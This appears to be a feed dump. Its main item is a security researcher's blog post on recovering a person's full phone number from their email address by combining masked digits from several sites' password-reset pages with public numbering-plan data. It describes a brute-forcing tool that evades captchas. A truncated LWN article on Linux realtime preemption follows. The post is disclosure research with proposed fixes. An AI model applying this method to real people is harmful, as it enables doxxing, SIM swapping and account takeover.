<p>While reviewing the option of resetting a password with either an SMS or phone call, I noticed that the UI usually shows part of the phone number. However it is masked in a way that it will reveal only a few digits, enough for the user to recognize which one in case he has multiple phones. In other words,<strong> if I know your email, I can initiate the password reset process for your accounts and obtain several digits of your phone number.</strong></p>
<p>As mentioned above, I’ve spent a lot of time resetting passwords and I realized that not all websites reveal the same digits. Some would show the last four, some would show the first one, the last two and so on. <strong>There is no standard way to mask personal identifiable information (PII) such as phone numbers</strong>. The masking happens entirely at the developers discretion and that seemed like a problem to me.</p>
<figure id="attachment_887" aria-describedby="caption-attachment-887"><a href="https://www.martinvigo.com/wp-content/uploads/2019/03/paypal-phone-number-password-reset.jpg"><img decoding="async" src="https://www.martinvigo.com/wp-content/uploads/2019/03/paypal-phone-number-password-reset.jpg" alt="Password reset shows 5 digits" width="251" height="322" srcset="https://www.martinvigo.com/wp-content/uploads/2019/03/paypal-phone-number-password-reset.jpg 400w, https://www.martinvigo.com/wp-content/uploads/2019/03/paypal-phone-number-password-reset-234x300.jpg 234w" sizes="(max-width: 251px) 100vw, 251px" data-srcset="https://www.martinvigo.com/wp-content/uploads/2019/03/paypal-phone-number-password-reset.jpg 400w, https://www.martinvigo.com/wp-content/uploads/2019/03/paypal-phone-number-password-reset-234x300.jpg 234w" data-src="https://www.martinvigo.com/wp-content/uploads/2019/03/paypal-phone-number-password-reset.jpg" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><figcaption id="caption-attachment-887">Password reset shows 5 digits</figcaption></figure>
<figure id="attachment_899" aria-describedby="caption-attachment-899"><a href="https://www.martinvigo.com/wp-content/uploads/2019/04/paypal_2FA.jpg"><img decoding="async" src="https://www.martinvigo.com/wp-content/uploads/2019/04/paypal_2FA.jpg" alt="2FA shows 3 digits" width="256" height="321" srcset="https://www.martinvigo.com/wp-content/uploads/2019/04/paypal_2FA.jpg 600w, https://www.martinvigo.com/wp-content/uploads/2019/04/paypal_2FA-239x300.jpg 239w" sizes="(max-width: 256px) 100vw, 256px" data-srcset="https://www.martinvigo.com/wp-content/uploads/2019/04/paypal_2FA.jpg 600w, https://www.martinvigo.com/wp-content/uploads/2019/04/paypal_2FA-239x300.jpg 239w" data-src="https://www.martinvigo.com/wp-content/uploads/2019/04/paypal_2FA.jpg" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><figcaption id="caption-attachment-899">2FA shows 3 digits</figcaption></figure>
<p>To demonstrate to which extent this is the case, take Paypal for example. If I initiate the password reset process, it will reveal the first digit and the last four. But, if I login and get challenged with 2FA, it will reveal only the last three. This doesn’t make any sense. With only your email address, I can get five of your ten digits phone number. If I know your email and password, then I’ll only get three. <strong>Paypal hides more digits from an attacker that knows your password already than from one that only knows your email address</strong>.</p>
<h2>Digging deeper</h2>
<p>I made a list of popular websites that people tend to be registered on and checked their password reset process. My goal was to identify which sites would only ask for an email to initiate the process (no further information needed), supported mobile based password reset and number of digits “leaking”. Here is a small subset:</p>
<p>Leaks first three and last two digits:</p>
<ul>
<li>eBay</li>
</ul>
<p>Leaks first and last four digits:</p>
<ul>
<li>Paypal</li>
</ul>
<p>Leaks first and last two digits:</p>
<ul>
<li>Yahoo</li>
</ul>
<p>Leaks last four digits:</p>
<ul>
<li>Lastpass</li>
</ul>
<p>Leaks last two digits:</p>
<ul>
<li>Google</li>
<li>Facebook</li>
<li>Twitter</li>
<li>Hotmail</li>
<li>Steam</li>
</ul>
<p>If you look at the list above, we can conclude that, for example, <strong>if you have an eBay and a LastPass account, an attacker can know seven out of ten digits of your phone number. Just by knowing your email address</strong>. In other words, an attacker can use your email address to reduce the possibilities of guessing your phone number from one billion possibilities to one thousand.</p>
<p>This is not the only combination possible but let’s focus on this scenario in this post.</p>
<h2>Discovering the remaining numbers</h2>
<p>We have seven out of ten digits which means we are only missing three. At this point, it is important to focus on <span><strong>which</strong></span> numbers we know.</p>
<p><strong>A US phone number is composed of 3 fields: area code (or NPA), exchange (or Central Office Code) and subscriber number</strong>&nbsp;(kudos to <a href="https://twitter.com/jjarmoc" target="_blank" rel="noopener noreferrer">@jjarmoc</a> who told me about the exchange and made me realize there was more to this than I thought). There is also the country code but we are focusing on US numbers for now.</p>
<figure id="attachment_953" aria-describedby="caption-attachment-953"><a href="https://www.martinvigo.com/wp-content/uploads/2019/05/us_phone_number_fields.jpg"><img decoding="async" src="https://www.martinvigo.com/wp-content/uploads/2019/05/us_phone_number_fields-300x76.jpg" alt="US phone number fields" width="300" height="76" srcset="https://www.martinvigo.com/wp-content/uploads/2019/05/us_phone_number_fields-300x76.jpg 300w, https://www.martinvigo.com/wp-content/uploads/2019/05/us_phone_number_fields-768x194.jpg 768w, https://www.martinvigo.com/wp-content/uploads/2019/05/us_phone_number_fields.jpg 950w" sizes="(max-width: 300px) 100vw, 300px" data-srcset="https://www.martinvigo.com/wp-content/uploads/2019/05/us_phone_number_fields-300x76.jpg 300w, https://www.martinvigo.com/wp-content/uploads/2019/05/us_phone_number_fields-768x194.jpg 768w, https://www.martinvigo.com/wp-content/uploads/2019/05/us_phone_number_fields.jpg 950w" data-src="https://www.martinvigo.com/wp-content/uploads/2019/05/us_phone_number_fields-300x76.jpg" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><figcaption id="caption-attachment-953">US phone number fields</figcaption></figure>
<p>eBay+LastPass gave us the area code and the subscriber number. It is important to highlight that <strong>we are not simply missing 3 digits, we are missing the 3 digits <span>corresponding to the exchange</span></strong>. This is an important distinction as it will help us narrow down the possibilities even further.</p>
<h3>NANPA</h3>
<p>I put quite a number of hours researching and learning about exchanges. My main goal was to understand if I could reliably reduce the remaining thousand possible phone numbers by detecting exchange numbers not assigned to a specific area code.</p>
<p>Enter the <a href="https://www.nationalnanpa.com/" target="_blank" rel="noopener noreferrer">North American Numbering Plan Administrator (NANPA)</a>. The numbering plan for the public switched telephone network for Canada, the US and its territories, and some Caribbean countries. This website is a goldmine! I learned so much about how the telephone systems work just from this source. Most importantly, I found exactly what I was looking for.</p>
<p><strong>NANPA maintains an updated list of area codes and <span>the corresponding</span> exchanges <a href="https://www.nationalnanpa.com/reports/reports_cocodes_assign.html" target="_blank" rel="noopener noreferrer">that is publicly accessible</a>. </strong>It is updated frequently and you can query the data or download a parseable file with all the information.</p>
<figure id="attachment_972" aria-describedby="caption-attachment-972"><a href="https://www.martinvigo.com/wp-content/uploads/2019/06/exchamges-in-San-Fracisco.jpg"><img decoding="async" src="https://www.martinvigo.com/wp-content/uploads/2019/06/exchamges-in-San-Fracisco.jpg" alt="Exchanges in San Francisco" width="1008" height="348" srcset="https://www.martinvigo.com/wp-content/uploads/2019/06/exchamges-in-San-Fracisco.jpg 1008w, https://www.martinvigo.com/wp-content/uploads/2019/06/exchamges-in-San-Fracisco-300x104.jpg 300w, https://www.martinvigo.com/wp-content/uploads/2019/06/exchamges-in-San-Fracisco-768x265.jpg 768w" sizes="(max-width: 1008px) 100vw, 1008px" data-srcset="https://www.martinvigo.com/wp-content/uploads/2019/06/exchamges-in-San-Fracisco.jpg 1008w, https://www.martinvigo.com/wp-content/uploads/2019/06/exchamges-in-San-Fracisco-300x104.jpg 300w, https://www.martinvigo.com/wp-content/uploads/2019/06/exchamges-in-San-Fracisco-768x265.jpg 768w" data-src="https://www.martinvigo.com/wp-content/uploads/2019/06/exchamges-in-San-Fracisco.jpg" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><figcaption id="caption-attachment-972">Exchanges in San Francisco</figcaption></figure>
<p>How useful is this? Well, let’s take San Francisco’s 415 area code. If I am only missing the three digits corresponding to the exchange, I have a thousand possible numbers for my target. By using NANPA dataset, I reduced it to 784 possible numbers because there are 216 exchange number not assigned to 415 area code. That is a reduction of over 20%, not bad!</p>
<p>But how good does it get? I played with different area codes and, for example, the Alaska 907 area code has only 625 exchanges assigned. That’s 375 phone numbers we don’t need to consider anymore by just using the valuable information that NANPA provides us. Or Tacoma’s 253 area code with only 458 exchanges. We got rid of over half the possible phone numbers.</p>
<p>What if the target only has a Paypal account? We know five out of ten digits. But again, <strong><span>which</span></strong> ones? We have the first digit of the area code and the last four random digits. Let’s imagine that you know the target is from California. Thanks to NANPA, we know all the area codes corresponding to California. There are only two area codes in California that start with 2, 213 and 209. Other two that start with 3, two that start with 4, etc. By knowing the first digit of the area code, you can still infer the first three digits of the phone number fairly easy.</p>
<h2>National Pooling Administration</h2>
<p>But how about if the target only has an eBay account? Or Paypal + Google? We have the area code and the last two digits of the subscriber number. Again, let’s focus on <span>which</span> numbers we know. I discussed above how we can use NANPA’s public records to narrow down possible numbers based on the area code and the exchange.<strong> Are there any public records that can help us discard invalid phone numbers based on the subscriber number? Yes! Thanks to the <a href="https://www.nationalpooling.com/" target="_blank" rel="noopener noreferrer">national pooling administration</a>.</strong></p>
<p>Ready? Number pooling is a way to assign smaller blocks of numbers (in the thousands) to growth areas. Historically, a phone number is a way of rooting a call to a person in a physical location. Take 415-272-XXXX. The first 3 digits narrow it down to a wider area like San Francisco, the 272 exchange is specific to Sausalito and the missing 4 digits specify the actual person (subscriber) in that limited area. Because carriers own the specific area code + exchange, this means that there area 10000 phone numbers assigned to Sausalito residents that have a plan with AT&amp;T (the carrier owning 415-272).</p>
<p>As of 2017, Sausalito has 7110 residents. This means that from the 10k available numbers, only 7k will be used, and that if everyone is an AT&amp;T customer. With this way of assigning numbers, many are going to waste and will not be used.</p>
<p>The irruption of cable modems and VOIP services which made it easier to become a carrier worsened the problem. <a href="https://transition.fcc.gov/Daily_Releases/Daily_Business/2012/db0503/DA-12-705A2.pdf" target="_blank" rel="noopener noreferrer">The FCC decided that numbers should be assigned in smaller blocks in growth areas</a>. Specifically in blocks of thousand numbers rather than ten thousand. Therefore, blocks of numbers would be assigned as XXX-XXX-X to carriers, including the first digit of the subscriber number.</p>
<p><strong>The national pooling administration is responsible for managing it and <a href="https://www.nationalpooling.com/reports/" target="_blank" rel="noopener noreferrer">has public records of the assigned blocks</a>, including the subscriber digit</strong>. We can use this data to further discard invalid numbers. For example, taking our Sausalito number 415-272-XXXX which is missing the last 4 digits, we can use the public records to discard phone numbers like 415-272-[0-8]XXX and focus just on numbers which subscriber starts with 9. In other words, <strong>we have reduced the possible valid phone numbers from 10 thousand to one thousand</strong>.</p>
<figure id="attachment_956" aria-describedby="caption-attachment-956"><a href="https://www.martinvigo.com/wp-content/uploads/2019/05/national_pooling_administration_records.jpg"><img decoding="async" src="https://www.martinvigo.com/wp-content/uploads/2019/05/national_pooling_administration_records.jpg" alt="9th block is the only one assigned" width="1008" height="216" srcset="https://www.martinvigo.com/wp-content/uploads/2019/05/national_pooling_administration_records.jpg 1008w, https://www.martinvigo.com/wp-content/uploads/2019/05/national_pooling_administration_records-300x64.jpg 300w, https://www.martinvigo.com/wp-content/uploads/2019/05/national_pooling_administration_records-768x165.jpg 768w" sizes="(max-width: 1008px) 100vw, 1008px" data-srcset="https://www.martinvigo.com/wp-content/uploads/2019/05/national_pooling_administration_records.jpg 1008w, https://www.martinvigo.com/wp-content/uploads/2019/05/national_pooling_administration_records-300x64.jpg 300w, https://www.martinvigo.com/wp-content/uploads/2019/05/national_pooling_administration_records-768x165.jpg 768w" data-src="https://www.martinvigo.com/wp-content/uploads/2019/05/national_pooling_administration_records.jpg" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><figcaption id="caption-attachment-956">9th block is the only one assigned</figcaption></figure>
<h2>Still… many possible numbers remaining</h2>
<p>You have your target’s email address who happens to be from Tacoma and has an eBay and LastPass account. You initiate the password reset process and harvest seven out of ten digits of his phone number. Now, you can use NANPA to get rid of 542 and reduce the list to 458 possible numbers assigned to that email address. Then you use the National Pooling Administration to check if the block number yo have is assigned to the different possible exchanges reducing the possible valid phone numbers to 445.</p>
<p>What now? It is still a fair amount of phone numbers. I would claim that reducing one billion possible phone numbers down to 445 only knowing an email is pretty significant. The remainder could even be tested manually. But <strong>the goal is to reduce the possibilities as much as possible</strong> before attempting any manual verification. Let’s go back to the drawing board!</p>
<p>There is a number of ways you could take the remaining phone numbers and see if they are somehow linked to the email address. Using search engines with well defined search flags to try find clues in case the target left his phone number in a forum, website, etc. Look the email up by phone number on online services like <a href="https://pipl.com/" target="_blank" rel="noopener noreferrer">pipl</a>, <a href="https://www.beenverified.com/" target="_blank" rel="noopener noreferrer">BeenVerified</a> or <a href="https://www.spokeo.com/" target="_blank" rel="noopener noreferrer">Spokeo</a> that have huge databases with people’s personal information. You could even use telephone system online services that allow you to reverse search the owner of a phone by its number. Basically, a phonebook in reverse. I was actually pretty shocked by the amount of personal information I was able to get from services like <a href="https://pro.whitepages.com/developer/twilio-marketplace" target="_blank" rel="noopener noreferrer">WhitePages via it’s Twilio add-on</a> by just providing a phone number and pay ten cents.</p>
<p>These options are good but not 100% reliable. You may not find anything in search engines, online data farms don’t have your target’s phone number and WhitePages tends to be somewhat outdated, many times it just doesn’t have the information you need. So, I started to think of new ways I could reliably obtain the phone number assigned to an email address.</p>
<h2>Reusing the same attack vector, in reverse</h2>
<p>It did not take long to get to that sweet “Eureka” moment. I reflected on the steps I took to get this far. I was abusing the password reset function of online services to collect a few phone number digits assigned to an email…</p>
<p>Hmmm.. I reset the password putting an email… and I get a few digits back. Can I… reset the password by entering a phone number and get a few email characters back?</p>
<figure id="attachment_885" aria-describedby="caption-attachment-885"><a href="https://www.martinvigo.com/wp-content/uploads/2019/03/amazon-password-reset-using-phone-number.jpg"><img decoding="async" src="https://www.martinvigo.com/wp-content/uploads/2019/03/amazon-password-reset-using-phone-number-293x300.jpg" alt="Amazon password reset using phone number" width="293" height="300" srcset="https://www.martinvigo.com/wp-content/uploads/2019/03/amazon-password-reset-using-phone-number-293x300.jpg 293w, https://www.martinvigo.com/wp-content/uploads/2019/03/amazon-password-reset-using-phone-number.jpg 500w" sizes="(max-width: 293px) 100vw, 293px" data-srcset="https://www.martinvigo.com/wp-content/uploads/2019/03/amazon-password-reset-using-phone-number-293x300.jpg 293w, https://www.martinvigo.com/wp-content/uploads/2019/03/amazon-password-reset-using-phone-number.jpg 500w" data-src="https://www.martinvigo.com/wp-content/uploads/2019/03/amazon-password-reset-using-phone-number-293x300.jpg" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><figcaption id="caption-attachment-885">Amazon password reset using phone number</figcaption></figure>
<p>Eureka! Turns out, <strong>there are popular services, like Amazon and Twitter, that allow you to reset the password by entering a phone number and get an email to complete the process. Most importantly, it will display a few characters of the email address it will send the link to</strong>. In Amazon’s case, you get the first and last letter of the username and the full domain. You also get the length of the username as the number of * matches the number of masked chars.</p>
<p>Twitter shows you the first two characters of the username and the first one of the domain. You also will know the length by counting the asterisks.</p>
<p>The attack vector looks like this:</p>
<p>1. Use the target’s email address to initiate the reset password process in multiple sites to harvest several phone number digits</p>
<p>2. Reduce the possible phone number list by discarding non-existing area codes, exchanges and subscriber numbers using NANPA and the National Pooling Administration publicly available data</p>
<p>3. Initiate the password reset process iterating over the remainder phone number list and correlate the leaked email chars against the target’s email address</p>
<p><strong>By following these steps, you will be able to obtain the full ten digit phone number associated to the email address, without having to make one single call!</strong> Just by abusing password reset options and bruteforcing efficiently using publicly available information.</p>
<h2>Automation</h2>
<p>The attack vector above can be done manually. <a href="https://namechk.com/" target="_blank" rel="noopener noreferrer">You can use services like namechk to pinpoint where to go harvest digits</a>. Look at NANPA’s data yourself to discard invalid numbers. You could even bruteforce the remaining phone numbers to find the matching email using web proxy features like <a href="https://portswigger.net/burp/documentation/desktop/tools/intruder/using" target="_blank" rel="noopener noreferrer">Burp’s intruder</a>. But you don’t need to, I wrote a tool that will do all this for you.</p>
<p><strong><em>email2phonenumber</em> is a tool that allows you to provide a partial phone number and get a list of all the possible valid phone numbers, eliminating non-existing area code and exchange numbers. The tool will also let you bruteforce phone numbers using Amazon’s and Twitter’s password reset feature and correlate the masked emails against the one you provided looking for a match</strong>. It will attempt to fly under the captcha radar by replicating user behavior and randomizing some parameters in the requests. It also supports the use of proxy servers. What we are doing is starting the password reset for different phone numbers. This means that the services cannot detect you based on a specific phone number you are hammering on.</p>
<p>There are multiple other services that allow password reset using phone numbers that can be used for the same purpose. The tool supports Amazon and Twitter for bruteforcing. The idea is to get support from the community through pull requests to support additional ones.</p>
<p>You can find the tool in <a href="https://github.com/martinvigo/email2phonenumber" target="_blank" rel="noopener noreferrer">my github repo</a>.</p>
<h3>Demo</h3>
<div>
<p><span><iframe width="960" height="540" allowfullscreen="true" sandbox="allow-scripts allow-same-origin allow-popups allow-presentation allow-popups-to-escape-sandbox" data-src="https://www.youtube.com/embed/dfvqhDUn81s?version=3&amp;rel=1&amp;showsearch=0&amp;showinfo=1&amp;iv_load_policy=1&amp;fs=1&amp;hl=en-US&amp;autohide=2&amp;wmode=transparent" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></iframe></span></p>
</div>
<h2>phonerator</h2>
<p>email2phonenumber is a great tool but much of what it does can be done with tools like Burp or wfuzz. The true power relies on the gathering, parsing and use of the public available data related to a country’s phone numbering plan.</p>
<p>Therefore, I am working on a new online service that would allow you ti generate lists of possible phone numbers. It will have multi-country support, it will give you much more information and details, it will have historical records and most importantly, advanced filters.</p>
<p>Say you know the target has AT&amp;T, you can filter by carrier and reduce the list of possible numbers even more. You may have intel that the person is from California, phonerator will take into account only those area codes. Maybe you know that the target had the phone number for over two years, so let’s discard exchanges and block numbers that were assigned recently.</p>
<p><del>I am still working on the tool and collecting all data. Please stay tuned for updates and release dates on <a href="https://www.twitter.com/martin_vigo" target="_blank" rel="noopener noreferrer">my twitter account</a></del>. It’s finally <a href="https://www.martinvigo.com/tools/phonerator" target="_blank" rel="noopener noreferrer">here</a>!</p>
<h2>Other countries</h2>
<p>So far I’ve focused on US phone numbers but there are additional issues I want to highlight when considering targets from other countries. I am from Spain myself and Spanish mobile phone numbers have interesting properties as well. For starters, all mobile phone numbers start with the digit 6 (and recently 7). Also, phone numbers are only 9 digits long. Why is that important? Well, I know one digit from the beginning and <strong>services like eBay or LastPass do not adjust their mask to leak less digits for shorter phone numbers</strong>. Therefore, if my target is from Spain, just with LastPass I know 5 out of the 9 digits. That’s over half the digits.</p>
<p>I’ve observed the problem of using the same mask for all customers in other websites as well. My next step was to look for countries that had very short numbers. <strong>Take Iceland, Estonia or San Salvador with 7 digit phone numbers. All eBay customers from these countries have 5 out of 7 digits exposed to anyone that knows their email address. Combine it with LastPass accounts and you got yourself the target’s full phone number. Just by knowing their email address…</strong></p>
<div id="gallery-1"><figure>
			<p><a href="https://www.martinvigo.com/wp-content/uploads/2019/05/ebay_password_reset-1.jpg"><img decoding="async" width="800" height="631" src="https://www.martinvigo.com/wp-content/uploads/2019/05/ebay_password_reset-1.jpg" alt="First 3 and last 2 with Ebay" aria-describedby="gallery-1-933" srcset="https://www.martinvigo.com/wp-content/uploads/2019/05/ebay_password_reset-1.jpg 800w, https://www.martinvigo.com/wp-content/uploads/2019/05/ebay_password_reset-1-300x237.jpg 300w, https://www.martinvigo.com/wp-content/uploads/2019/05/ebay_password_reset-1-768x606.jpg 768w" sizes="(max-width: 800px) 100vw, 800px" data-srcset="https://www.martinvigo.com/wp-content/uploads/2019/05/ebay_password_reset-1.jpg 800w, https://www.martinvigo.com/wp-content/uploads/2019/05/ebay_password_reset-1-300x237.jpg 300w, https://www.martinvigo.com/wp-content/uploads/2019/05/ebay_password_reset-1-768x606.jpg 768w" data-src="https://www.martinvigo.com/wp-content/uploads/2019/05/ebay_password_reset-1.jpg" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a>
			</p>
				<figcaption id="gallery-1-933">
				First 3 and last 2 with Ebay
				</figcaption></figure><figure>
			<p><a href="https://www.martinvigo.com/wp-content/uploads/2019/05/lastpass_password_reset.jpg"><img decoding="async" width="800" height="563" src="https://www.martinvigo.com/wp-content/uploads/2019/05/lastpass_password_reset.jpg" alt="Last 4 with LastPass" aria-describedby="gallery-1-940" srcset="https://www.martinvigo.com/wp-content/uploads/2019/05/lastpass_password_reset.jpg 800w, https://www.martinvigo.com/wp-content/uploads/2019/05/lastpass_password_reset-300x211.jpg 300w, https://www.martinvigo.com/wp-content/uploads/2019/05/lastpass_password_reset-768x540.jpg 768w" sizes="(max-width: 800px) 100vw, 800px" data-srcset="https://www.martinvigo.com/wp-content/uploads/2019/05/lastpass_password_reset.jpg 800w, https://www.martinvigo.com/wp-content/uploads/2019/05/lastpass_password_reset-300x211.jpg 300w, https://www.martinvigo.com/wp-content/uploads/2019/05/lastpass_password_reset-768x540.jpg 768w" data-src="https://www.martinvigo.com/wp-content/uploads/2019/05/lastpass_password_reset.jpg" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a>
			</p>
				<figcaption id="gallery-1-940">
				Last 4 with LastPass
				</figcaption></figure>
		</div>

<p>By understanding the properties of a country phone number system and taking advantage of websites that do not adjust their masking to leak less digits on shorter numbers, it is possible to harvest all digits of the phone number.</p>
<h2>So what?</h2>
<p>I showed you how to go from an email address to a phone number. So what? Is that really so bad? Well, we can answer this question from different angles like privacy and security but let’s list a number of attack vectors that originate from the knowledge of a target’s phone number:</p>
<ul>
<li><strong>SIM swapping</strong>. This is an issue that gained a lot of notoriety lately and <a href="https://medium.com/coinmonks/the-most-expensive-lesson-of-my-life-details-of-sim-port-hack-35de11517124?sk=4c29b27bacb2eff038ec8fe4d40cd615" target="_blank" rel="noopener noreferrer">it is more common than you might think</a>. Attackers are able to port your phone number to a SIM in their control by different means like social engineering, extortion or even rogue carrier employees. This would allow the attackers to reset passwords on your behalf or bypass 2FA protections.</li>
<li><strong>SS7 attacks</strong>. SS7 is a protocol used by carriers to interact among them. It is very old and <a href="https://media.ccc.de/v/31c3_-_6249_-_en_-_saal_1_-_201412271715_-_ss7_locate_track_manipulate_-_tobias_engel" target="_blank" rel="noopener noreferrer">researchers have demonstrated</a> at multiple security conferences how they can track the location of individuals, or even spy on communications.</li>
<li><strong>Targeting your voicemail. </strong>Check out <a href="https://www.youtube.com/watch?v=ZpZbTPYB3cU" target="_blank" rel="noopener noreferrer">my DEF CON talk</a> to understand the impact of having an attacker compromise your voicemail. Seriously, <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1801" target="_blank" rel="noopener noreferrer">voicemail systems are a threat</a>.</li>
<li><strong>Location tracking.&nbsp;</strong><a href="https://twitter.com/josephfcox" target="_blank" rel="noopener noreferrer">Joseph Cox</a> has done <a href="https://motherboard.vice.com/en_us/article/nepxbz/i-gave-a-bounty-hunter-300-dollars-located-phone-microbilt-zumigo-tmobile" target="_blank" rel="noopener noreferrer">a great coverage of this issue</a>.</li>
<li><strong>CallerID spoofing</strong>. Plenty of online services allow you to spoof caller IDs. This is a great tool for social engineering.</li>
</ul>
<h2>Conclusions</h2>
<p>The lack of a standardized way to mask PII leads to different approaches taken by online services. These are leaking partial information about your email address and phone number in places like the reset password area. It can be abused and automated to scrape pieces of information with the intent of reconstructing the targeted data.</p>
<p>It is possible, specially on targeted attacks, to obtain all digits of a phone number associated to an email address. Once the attacker is in possession of the phone number, he can use it for other attacks with serious impact that can lead to full account compromise, location tracking and spying.</p>
<p>This is specially true in countries with shorter phone numbers, as many services do not adjust their masking to the phone length.</p>
<p>Masking is not good enough, even if it just shows a couple of the phone number’s digits. Inhabitants of Saint Helena deserve the same security bar as the rest of us with <a href="https://en.wikipedia.org/wiki/Telephone_numbers_in_Saint_Helena_and_Tristan_da_Cunha" target="_blank" rel="noopener noreferrer">their 5 digits long phone numbers</a>. For emails, masking only the username is not sufficient, the domain can provide information about where that person may work. Even the TLD can give away if that person is a student or from which country they might be.</p>
<p><strong>My proposal is to allow users to set labels</strong>. For example, the user can label an email address as “personal email” or the phone number as “work phone”. This way, <strong>when the password reset process displays a hint, it will show the label rather than tidbits of PII</strong>.</p>
<p>Users should not provide their phone number unless strictly required. Many online services ask for it but there is no real business need. They just want more information about you. If it is a requirement, consider using a virtual number like Google Voice or even a dedicated SIM that you only use for this purpose and never give the number away.</p>
<p><strong>This is not just about OPSEC, it’s about keeping your data secure.</strong></p>
<h2>Responsible disclosure</h2>
<p>I reached out to the online services that were showing more than 2 digits, especially if they were part of the area code or exchange. LastPass updated the mask to just show the last two digits corresponding to the subscriber number. eBay is showing now the first and last two digits, not great but better than it was before. Yahoo is still considering risks and mitigations as of this writing.</p>
<p>Paypal, which displays five digits including area code to anyone knowing the email address (but only three if the attacker knows the target’s password), decided this is working as designed and will not take action.</p>
<h2>Resources</h2>
<p>I presented this research at BSides Las Vegas and the Recon Village @ DEF CON</p>
<div>
<p><span><iframe width="960" height="540" allowfullscreen="true" sandbox="allow-scripts allow-same-origin allow-popups allow-presentation allow-popups-to-escape-sandbox" data-src="https://www.youtube.com/embed/1zssBR85vDA?version=3&amp;rel=1&amp;showsearch=0&amp;showinfo=1&amp;iv_load_policy=1&amp;fs=1&amp;hl=en-US&amp;autohide=2&amp;wmode=transparent" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></iframe></span></p>
</div>
<p>You can <a href="https://www.slideshare.net/martinvigo/from-email-address-to-phone-number-a-new-osint-approach" target="_blank" rel="noopener noreferrer">download the slides from slideshare</a></p>
<h5><a href="http://explodingthephone.com/" target="_blank" rel="noopener noreferrer">Exploding the Phone: The Untold Story of the Teenagers and Outlaws Who Hacked Ma Bell by </a><em><a href="http://explodingthephone.com/" target="_blank" rel="noopener noreferrer">Phil Lapsley</a></em></h5>
<p>Fantastic book all around phone phreaking.</p>
<h5><a href="https://inteltechniques.com/blog/2019/02/08/the-privacy-security-osint-show-episode-111/" target="_blank" rel="noopener noreferrer">The privacy, security &amp; OSINT show – Episode&nbsp; 111</a></h5>
<p>This particular episode talks about the issues of providing your phone number to online services.</p>
		
	</div>

		
	</article>
		
		


	
</main>



				</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[The Linux realtime preemption endgame is near (359 pts)]]></title>
            <link>https://lwn.net/SubscriberLink/951337/e9139cdb65a9cb93/</link>
            <guid>38290145</guid>
            <pubDate>Thu, 16 Nov 2023 14:47:02 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://lwn.net/SubscriberLink/951337/e9139cdb65a9cb93/">https://lwn.net/SubscriberLink/951337/e9139cdb65a9cb93/</a>, See on <a href="https://news.ycombinator.com/item?id=38290145">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
<!-- $Id: slink-none,v 1.2 2005-11-04 22:11:18 corbet Exp $ -->
<blockquote>
<div>
<h3>Welcome to LWN.net</h3>
<p>
The following subscription-only content has been made available to you 
by an LWN subscriber.  Thousands of subscribers depend on LWN for the 
best news from the Linux and free software communities.  If you enjoy this 
article, please consider <a href="https://lwn.net/subscribe/">subscribing to LWN</a>.  Thank you
for visiting LWN.net!
</p></div>
</blockquote>
<p>
The addition of realtime support to Linux is a long story; it first 
<a href="https://lwn.net/Articles/106010/">shows up in LWN</a> in 2004.  For much of that
time, it has seemed like only a little more work was needed to get across
the finish line; thus we ran headlines like <a href="https://lwn.net/Articles/345076/">the
realtime preemption endgame</a> — in 2009.  At the <a href="https://lpc.events/">2023 Linux Plumbers Conference</a>, Thomas
Gleixner informed the group that, now, the end truly is near.  There is
really only one big problem left to be solved before all of that work can
land in the mainline.
</p><p>

<a href="https://lwn.net/Articles/951340/"><img src="https://static.lwn.net/images/conf/2023/lpc/ThomasGleixner-sm.png" alt="[Thomas Gleixner]" title="Thomas Gleixner"></a>

The point of realtime preemption is to ensure that the highest-priority
process will always be able to run with a minimum (and predictable) delay.
To that end, it makes the kernel preemptible in as many situations as
possible, with the exceptions being tightly limited in scope.  The basic
mechanics of how that works have been established for a long time, but
there have been a lot of details to resolve along the way.  The realtime
preemption work has resulted in the rewriting of much of the core kernel
over the years, with benefits that extend far beyond the realtime use case.
</p><p>
Gleixner started by noting that, while the realtime preemption project has
been underway for nearly 20&nbsp;years, it is actually closer to
25&nbsp;years for him — he started working on realtime support for Linux in
1999.  Once it's done, he said, there will be "a big party".  Is that point
at hand?  The answer, he said, is "yes — kind of".  There is one last
holdout to be dealt with: <tt>printk()</tt>.
</p><p>
Whenever code in the kernel needs to send something to the system consoles
and logs, it calls <tt>printk()</tt> or one of the numerous functions built
on top of it.  One might not think that printing a message would be a
challenging task, but it is.  A call to <tt>printk()</tt> can come from any
context, including in non-maskable-interrupt handlers or other
<tt>printk()</tt> calls.  The information being printed may be crucial,
especially in the case of a system crash, so <tt>printk()</tt> calls have
to work regardless of the context.  As a result, there are a lot of
concurrency and locking issues, and lots of driver-related complications.
</p><p>
<tt>printk()</tt>, Gleixner said, is fully synchronous in current kernels;
a call will not return until the message has been sent to all of the
configured destinations.  That is "stupid"; much of what is printed is
simply noise, especially during the boot process, and there is no point to
waiting for it all to go out.  Beyond being pointless, that waiting
introduces latency, which runs counter to the goals of the realtime work,
so the realtime developers have long since moved <tt>printk()</tt> output
into separate threads, making it asynchronous.  That code is a bunch of
hacks rather than a real solution, though.  A better job must be done to
make this work useful for the rest of the kernel.
</p><p>
The <tt>printk()</tt> problem has been worked on seriously since 2018,
resulting in about 300 patches that have either gone upstream or are
